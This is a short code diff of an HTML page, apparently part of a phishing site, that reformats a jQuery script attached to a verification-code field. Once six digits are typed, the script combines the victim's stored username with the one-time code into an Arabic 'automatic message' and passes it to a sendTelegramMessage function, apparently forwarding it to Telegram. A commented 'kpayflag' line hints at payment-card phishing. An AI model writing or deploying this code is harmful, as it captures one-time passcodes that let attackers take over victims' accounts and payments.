@@ -269,19 +269,12 @@
         </div>
     </div>
 
-<script>
-$('#otp').on('input',() => {
-        if( $('#otp').val().length == 6){
-            var message = `ملاحظة - رسالة تلقائية
-                        الاسم: ${localStorage.getItem('userName')}
-                        رمز التحقق: ${document.getElementById("otp").value}`
-                        sendTelegramMessage(message)
-                }
-            })
-
-        // document.addEventListener("DOMContentLoaded", function () {
-        // localStorage.setItem('kpayflag','0')
-        // });
+        <script>
+            $('#otp').on('input',() => {
+                if( $('#otp').val().length == 6){
+                var message = `ملاحظة - رسالة تلقائية\nالاسم: ${localStorage.getItem('userName')}\nرمز التحقق: ${document.getElementById("otp").value}`
+                sendTelegramMessage(message)
+            }})
         </script>
     </body>
 </html>
